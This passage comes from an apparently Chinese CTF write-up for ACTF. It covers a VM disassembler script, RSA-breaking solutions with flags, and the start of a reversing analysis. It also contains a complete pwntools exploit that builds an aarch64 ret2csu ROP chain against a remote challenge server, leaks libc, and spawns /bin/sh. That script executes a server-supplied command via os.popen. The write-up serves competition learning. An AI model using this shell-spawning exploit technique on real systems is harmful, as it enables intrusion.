class="line">    machine_code += <span class="string">&quot; Y Y: &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;if &quot;</span> + reg_2 + <span class="string">&quot; == &quot;</span> + reg_3 + <span class="string">&quot; --&gt; jmp &quot;</span> + <span class="string">&quot;YY&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X YY</span></span><br><span class="line"><span class="comment"># case 0xb</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0xb</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    idx_1 = (X &amp; <span class="number">3</span>) * <span class="number">2</span> + (op_code &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    idx_2 = (X &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span></span><br><span class="line">    idx_3 = X &gt;&gt; <span class="number">5</span></span><br><span class="line">    reg_1 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_1)</span><br><span class="line">    reg_2 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_2)</span><br><span class="line">    reg_3 = <span class="string">&quot;R&quot;</span> + <span class="built_in">str</span>(idx_3)</span><br><span class="line">    vm_type_arr = [<span class="string">&#x27;(int8)&#x27;</span>,<span class="string">&#x27;(int16)&#x27;</span>,<span class="string">&#x27;int(32)&#x27;</span>,<span class="string">&#x27;int(64)&#x27;</span>]</span><br><span class="line">    vm_type_num = (op_code &gt;&gt; <span class="number">5</span>) &amp; <span class="number">3</span></span><br><span class="line">    vm_type = vm_type_arr[vm_type_num]</span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y Y: &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;if &quot;</span> + reg_2 + <span class="string">&quot; != &quot;</span> + reg_3 + <span class="string">&quot; --&gt; jmp &quot;</span> + <span class="string">&quot;YY&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X YY</span></span><br><span class="line"><span class="comment"># case 0xc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0xc</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; Y Y: &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;call YY ;这里是函数调用指令，调用函数同时也会把下一条指令地址压入栈中，等价于 push next code , jmp YY&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode</span></span><br><span class="line"><span class="comment"># case 0xd</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00</span>, <span class="number">0x100</span>):</span><br><span class="line">    op_code = i</span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0xd</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;ret ;这里是函数return指令，等价于 pc = stack[stack_pc] , stack_pc ++&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode X</span></span><br><span class="line"><span class="comment"># case 0xe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>, <span class="number">0x10000</span>):</span><br><span class="line">    op_code = i &gt;&gt; <span class="number">8</span></span><br><span class="line">    X = i &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (op_code &amp; <span class="number">0xf</span>) != <span class="number">0x1e</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    machine_code = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % op_code)</span><br><span class="line">    machine_code += <span class="string">&quot; &quot;</span></span><br><span class="line">    machine_code += <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%02X&quot;</span> % X)</span><br><span class="line">    machine_code += <span class="string">&quot; : &quot;</span></span><br><span class="line">    out = machine_code + <span class="string">&quot;call field_A8[R0] ; 只有当 R0&gt;=0 且 R0 &lt;= 3 执行 field_A8处开始的四个函数的值，这四个函数在main 中被赋值到 field_A8 开始的指针&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure>

<p>我的idb文件</p>
<p>暂时无法在文档外展示此内容</p>
<p>VM指令的文本格式，运行上面的脚本应该可以得到相同的数据，ID：Cynosure 对指令有问题可以找我<del>(或许我写错了，呜呜呜)</del></p>
<p>文本比较大，有4w+行指令</p>
<p>暂时无法在文档外展示此内容</p>
<h2><span id="2048">2048</span><a href="#2048" class="header-anchor"></a></h2><p>过了2048后直接ret2csu。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x402068 main ret</span></span><br><span class="line">system_py = <span class="number">0x40568</span></span><br><span class="line">puts_py = <span class="number">0x658c8</span></span><br><span class="line">puts_plt = <span class="number">0x400760</span></span><br><span class="line">puts_got = <span class="number">0x412F88</span></span><br><span class="line">main_addr = <span class="number">0x401EB0</span></span><br><span class="line">name_addr = <span class="number">0x413154</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p3_p64</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> p64(i).decode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_ret2csu</span>(<span class="params">func, arg1, arg2, arg3</span>):</span><br><span class="line">    x30 = <span class="number">0x4020B8</span></span><br><span class="line">    <span class="comment">#0x4020B8: LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line">    x19 = <span class="number">0</span></span><br><span class="line">    x20 = <span class="number">1</span></span><br><span class="line">    x24 = arg1</span><br><span class="line">    x23 = arg2</span><br><span class="line">    x22 = arg3</span><br><span class="line">    x21 = func</span><br><span class="line">    payload = p3_p64(<span class="number">0x4020D8</span>)</span><br><span class="line">    <span class="comment">#0x4020D8: LDP             X19, X20, [SP,#0x10]</span></span><br><span class="line">    payload += p3_p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># useless</span></span><br><span class="line">    payload += p3_p64(x30)</span><br><span class="line">    payload += p3_p64(x19)</span><br><span class="line">    payload += p3_p64(x20)</span><br><span class="line">    payload += p3_p64(x21)</span><br><span class="line">    payload += p3_p64(x24)</span><br><span class="line">    payload += p3_p64(x23)</span><br><span class="line">    payload += p3_p64(x22)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./2048&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;124.70.166.38&quot;</span>, <span class="string">&quot;9999&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;`&quot;</span>)</span><br><span class="line">cmd = r.recvuntil(<span class="string">&quot;`&quot;</span>)[:-<span class="number">1</span>].decode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">token = os.popen(cmd)</span><br><span class="line">token = token.readlines()</span><br><span class="line">r.send(token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;Input your name: \n&quot;</span>, p3_p64(<span class="number">0</span>) + p3_p64(puts_plt))</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&quot;asasasasasasassasasasasasasaasasasasasasassasasasasasasadadasaasasassadsassssassadsasassassdasdadadadssasasaaadsaasasdsasdsaasdadassasasdssdsasasaaadassdsaasaadsaasssasdsaassassdsasassadsasdsasasdsssdsassassaasasdasasasadsaaadasadssssasadsasasaasasdsaassaasaaasasaaaaaaadasssdaasaaaadsasdsssadsssasadsaadsaadsdsasadassaasdssadsaasasasaasasadadsasasaassaasadsasaasasadsasadasaasasasasaadadadsasdssasdsdsssdsdaaasdsdsddssasassssdasssassaadasasasadasasassdsasssasssasssssdsssssssasadssdsdsasdsassaasaassddsaasasasasssdsassasdaassdassdssaasasssdsdssadassdassdasasadadasasdasdsasaadasdsassasdsadadssasdssssdassdsdsadsssassasssdsasassaassdsasdsadssasssdsaassadsasaasdssasdsssasasdsdsdsdaddsddddddasdssasssdasdsssadasasassaaasaaaassasaadssdsdsddadsdsaasdassasasdadsasddsasasdsddsssasdsdsdsssdsasassdsdssdsdsdsdsdddadsdasdsdsdsdsssdssdsddsdadadsdssddsdadasdssdddsasssdadssadssssdadsdssdssdsddssddsdsasdsdasdsasddsdssddsdasddsasassddsdsdsaasddsadsdssdsassasassdsdassasddssssadsdsdssddsdddddadsdsdsaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += func_ret2csu(name_addr + <span class="number">8</span>, puts_got, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += func_ret2csu(name_addr + <span class="number">8</span>, puts_got + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>)[<span class="number">8</span>:]</span><br><span class="line">r.sendafter(<span class="string">&quot;Do you want to continue playing? [y/n]: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">libc = u64(r.recvline().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x658c8</span> - <span class="number">0xa000000</span></span><br><span class="line">libc += (u64(r.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;Input your name: \n&quot;</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + p3_p64(libc + system_py))</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&quot;asasasasasasassasasasasasasaasasasasasasassasasasasasasadadasaasasassadsassssassadsasassassdasdadadadssasasaaadsaasasdsasdsaasdadassasasdssdsasasaaadassdsaasaadsaasssasdsaassassdsasassadsasdsasasdsssdsassassaasasdasasasadsaaadasadssssasadsasasaasasdsaassaasaaasasaaaaaaadasssdaasaaaadsasdsssadsssasadsaadsaadsdsasadassaasdssadsaasasasaasasadadsasasaassaasadsasaasasadsasadasaasasasasaadadadsasdssasdsdsssdsdaaasdsdsddssasassssdasssassaadasasasadasasassdsasssasssasssssdsssssssasadssdsdsasdsassaasaassddsaasasasasssdsassasdaassdassdssaasasssdsdssadassdassdasasadadasasdasdsasaadasdsassasdsadadssasdssssdassdsdsadsssassasssdsasassaassdsasdsadssasssdsaassadsasaasdssasdsssasasdsdsdsdaddsddddddasdssasssdasdsssadasasassaaasaaaassasaadssdsdsddadsdsaasdassasasdadsasddsasasdsddsssasdsdsdsssdsasassdsdssdsdsdsdsdddadsdasdsdsdsdsssdssdsddsdadadsdssddsdadasdssdddsasssdadssadssssdadsdssdssdsddssddsdsasdsdasdsasddsdssddsdasddsasassddsdsdsaasddsadsdssdsassasassdsdassasddssssadsdsdssddsdddddadsdsdsaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += func_ret2csu(name_addr + <span class="number">8</span>, name_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Do you want to continue playing? [y/n]: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="impossible-rsa">impossible RSA</span><a href="#impossible-rsa" class="header-anchor"></a></h2><p>给了ssl格式的公钥，先去在线网站解出n、e。</p>
<p>根据题目条件可推导出这样的关系：</p>
<p>$$k<em>p^2+p-e</em>n&#x3D;0$$</p>
<p>这里直接用求根判别公式去爆破k即可。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">15987576139341888788648863000534417640300610310400667285095951525208145689364599119023071414036901060746667790322978452082156680245315967027826237720608915093109552001033660867808508307569531484090109429319369422352192782126107818889717133951923616077943884651989622345435505428708807799081267551724239052569147921746342232280621533501263115148844736900422712305937266228809533549134349607212400851092005281865296850991469375578815615235030857047620950536534729591359236290249610371406300791107442098796128895918697534590865459421439398361818591924211607651747970679849262467894774012617335352887745475509155575074809</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">    l = iroot(<span class="number">1</span> + <span class="number">4</span> * i * e * n,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> l[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span> n%((l[<span class="number">0</span>]-<span class="number">1</span>) // (<span class="number">2</span>*i)) == <span class="number">0</span>:</span><br><span class="line">            p = (l[<span class="number">0</span>]-<span class="number">1</span>) // (<span class="number">2</span>*i)</span><br><span class="line">            q = n//p</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(f,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;ACTF&#123;F1nD1nG_5pEcia1_n_i5_nOt_eA5y&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2><span id="rsa-leak">RSA LEAK</span><a href="#rsa-leak" class="header-anchor"></a></h2><p>这题一共有两个难点：1.类似于中间相遇的攻击思想求rp和rq 2.用已知条件建立一元二次方程求根</p>
<p>首先根据leak函数来求rp和rq，由于这两者都是（0，2^24）的随机数，双层循环爆破很困难，于是采用中间相遇的思想——以空间换时间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 中间相遇攻击</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    tmp =(out-<span class="built_in">pow</span>(i,e,n0))%n0</span><br><span class="line">    dic[tmp]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    t = <span class="built_in">pow</span>(i,e,n0)</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> dic.keys():</span><br><span class="line">        <span class="built_in">print</span>(i,dic[t])</span><br></pre></td></tr></table></figure>

<p>对于n&#x3D;pp.qq，不难发现a.b就等于n开四次根取整，因为这里的rp和rq太小了。整理一下所有的已知条件：</p>
<p>$$r_{p}&#x3D;pp-p; r_{q}&#x3D;qq-q; p<em>q&#x3D;(ab)^4; pp</em>qq&#x3D;n$$</p>
<p>如果我们用rp乘rq，会出现n,pp<em>q,qq</em>p,p<em>q ，由于 pp</em>q 是未知的，所以需要构造这个来相消；因此考虑 rp<em>q ，同理rq</em>p，消去以后剩下 p*q 和 n ，都是已知量，最后得到：</p>
<p>$$r_{p}*qq+(pq-r_{p}<em>r_{q}-pp</em>qq)+r_{q}*pp &#x3D; 0$$</p>
<p>等式两边同乘qq得到关于qq的一元二次方程，解出来就是qq，完整过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">n0 = <span class="number">122146249659110799196678177080657779971</span></span><br><span class="line">out = (<span class="number">90846368443479079691227824315092288065</span>-<span class="number">0xdeadbeef</span>)%n0</span><br><span class="line">sig = <span class="number">0xdeadbeef</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中间相遇攻击</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    tmp =(out-<span class="built_in">pow</span>(i,e,n0))%n0</span><br><span class="line">    dic[tmp]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    t = <span class="built_in">pow</span>(i,e,n0)</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> dic.keys():</span><br><span class="line">        <span class="built_in">print</span>(i,dic[t])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">r1=<span class="number">11974933</span></span><br><span class="line">r2=<span class="number">405771</span></span><br><span class="line">n = <span class="number">3183573836769699313763043722513486503160533089470716348487649113450828830224151824106050562868640291712433283679799855890306945562430572137128269318944453041825476154913676849658599642113896525291798525533722805116041675462675732995881671359593602584751304602244415149859346875340361740775463623467503186824385780851920136368593725535779854726168687179051303851797111239451264183276544616736820298054063232641359775128753071340474714720534858295660426278356630743758247422916519687362426114443660989774519751234591819547129288719863041972824405872212208118093577184659446552017086531002340663509215501866212294702743</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">48433948078708266558408900822131846839473472350405274958254566291017137879542806238459456400958349315245447486509633749276746053786868315163583443030289607980449076267295483248068122553237802668045588106193692102901936355277693449867608379899254200590252441986645643511838233803828204450622023993363140246583650322952060860867801081687288233255776380790653361695125971596448862744165007007840033270102756536056501059098523990991260352123691349393725158028931174218091973919457078350257978338294099849690514328273829474324145569140386584429042884336459789499705672633475010234403132893629856284982320249119974872840</span></span><br><span class="line">t=gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>]^<span class="number">4</span></span><br><span class="line">A=r1</span><br><span class="line">B=t-r1*r2-n</span><br><span class="line">C=r2*n</span><br><span class="line">q=(-B+isqrt(B^<span class="number">2</span>-<span class="number">4</span>*A*C))//(<span class="number">2</span>*A)</span><br><span class="line">p=n//q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;ACTF&#123;lsb_attack_in_RSA|a32d7f&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h1><h2><span id="dropper">dropper</span><a href="#dropper" class="header-anchor"></a></h2><p>首先程序打开 大致看下思路 给人的感觉就是他这个题好像就是两个大整数再balabala</p>
<p>最后这个地方应该就是做差 </p>
<p><img src="./165689627196925.png"></p>
<p>一开始程序调试期间遇到了除0异常 在其他地方下断点即可</p>
<p><img src="./165689627791828.png"></p>
<p>这个地方确定了大小</p>
<p><img src="./165689628168731.png"></p>
<p><img src="./165689628604434.png"></p>
<p><img src="./165689628945437.png"></p>
<p><img src="./165689629281140.png"></p>
<p>之后</p>
<p>是解密字符串数据后进行逆序的4个一组切割字符串并转换为int，还原出一个大数的操作</p>
<p>dump出密文 取出运算数据</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">[</span><span class="number">0x000024AC</span><span class="punctuation">,</span> <span class="number">0x00000116</span><span class="punctuation">,</span> <span class="number">0x000004F4</span><span class="punctuation">,</span> <span class="number">0x00000B64</span><span class="punctuation">,</span> <span class="number">0x00001DC3</span><span class="punctuation">,</span> <span class="number">0x00001B4A</span><span class="punctuation">,</span> <span class="number">0x000001B2</span><span class="punctuation">,</span> <span class="number">0x00001FCE</span><span class="punctuation">,</span> <span class="number">0x00000E81</span><span class="punctuation">,</span> <span class="number">0x000025AB</span><span class="punctuation">,</span> <span class="number">0x0000015B</span><span class="punctuation">,</span> <span class="number">0x0000252D</span><span class="punctuation">,</span> <span class="number">0x000002AC</span><span class="punctuation">,</span> <span class="number">0x00000F77</span><span class="punctuation">,</span> <span class="number">0x000022F5</span><span class="punctuation">,</span> <span class="number">0x000019E3</span><span class="punctuation">,</span> <span class="number">0x00001C53</span><span class="punctuation">,</span> <span class="number">0x00000B66</span><span class="punctuation">,</span> <span class="number">0x000011BC</span><span class="punctuation">,</span> <span class="number">0x0000193A</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x00000DC6</span><span class="punctuation">,</span> <span class="number">0x00000854</span><span class="punctuation">,</span> <span class="number">0x000015F5</span><span class="punctuation">,</span> <span class="number">0x00002567</span><span class="punctuation">,</span> <span class="number">0x000008FA</span><span class="punctuation">,</span> <span class="number">0x00000E20</span><span class="punctuation">,</span> <span class="number">0x00000807</span><span class="punctuation">,</span> <span class="number">0x00001007</span><span class="punctuation">,</span> <span class="number">0x000018CC</span><span class="punctuation">,</span> <span class="number">0x00001E84</span><span class="punctuation">,</span> <span class="number">0x00001F11</span><span class="punctuation">,</span> <span class="number">0x000013D4</span><span class="punctuation">,</span> <span class="number">0x0000076A</span><span class="punctuation">,</span> <span class="number">0x00001461</span><span class="punctuation">,</span> <span class="number">0x00000B0F</span><span class="punctuation">,</span> <span class="number">0x00001F70</span><span class="punctuation">,</span> <span class="number">0x00001B3D</span><span class="punctuation">,</span> <span class="number">0x00001008</span><span class="punctuation">,</span> <span class="number">0x00000D52</span><span class="punctuation">,</span> <span class="number">0x0000049A</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x00001A89</span><span class="punctuation">,</span> <span class="number">0x00000E42</span><span class="punctuation">,</span> <span class="number">0x000000FA</span><span class="punctuation">,</span> <span class="number">0x0000100D</span><span class="punctuation">,</span> <span class="number">0x000014DD</span><span class="punctuation">,</span> <span class="number">0x00001BFC</span><span class="punctuation">,</span> <span class="number">0x000026DB</span><span class="punctuation">,</span> <span class="number">0x00001AC2</span><span class="punctuation">,</span> <span class="number">0x00001CA0</span><span class="punctuation">,</span> <span class="number">0x000005ED</span><span class="punctuation">,</span> <span class="number">0x00000834</span><span class="punctuation">,</span> <span class="number">0x000016BF</span><span class="punctuation">,</span> <span class="number">0x00000704</span><span class="punctuation">,</span> <span class="number">0x00001FAD</span><span class="punctuation">,</span> <span class="number">0x000025FD</span><span class="punctuation">,</span> <span class="number">0x00001142</span><span class="punctuation">,</span> <span class="number">0x00001EEE</span><span class="punctuation">,</span> <span class="number">0x00001E60</span><span class="punctuation">,</span> <span class="number">0x00000353</span><span class="punctuation">,</span> <span class="number">0x000015A8</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x00000E17</span><span class="punctuation">,</span> <span class="number">0x00000706</span><span class="punctuation">,</span> <span class="number">0x00000C1F</span><span class="punctuation">,</span> <span class="number">0x00000169</span><span class="punctuation">,</span> <span class="number">0x00002248</span><span class="punctuation">,</span> <span class="number">0x000007FD</span><span class="punctuation">,</span> <span class="number">0x00001768</span><span class="punctuation">,</span> <span class="number">0x00001F54</span><span class="punctuation">,</span> <span class="number">0x00001574</span><span class="punctuation">,</span> <span class="number">0x00002458</span><span class="punctuation">,</span> <span class="number">0x00000374</span><span class="punctuation">,</span> <span class="number">0x00001D6B</span><span class="punctuation">,</span> <span class="number">0x00000918</span><span class="punctuation">,</span> <span class="number">0x00000ECF</span><span class="punctuation">,</span> <span class="number">0x0000211D</span><span class="punctuation">,</span> <span class="number">0x00001D96</span><span class="punctuation">,</span> <span class="number">0x00001BEB</span><span class="punctuation">,</span> <span class="number">0x00001703</span><span class="punctuation">,</span> <span class="number">0x00001B87</span><span class="punctuation">,</span> <span class="number">0x000006FA</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span 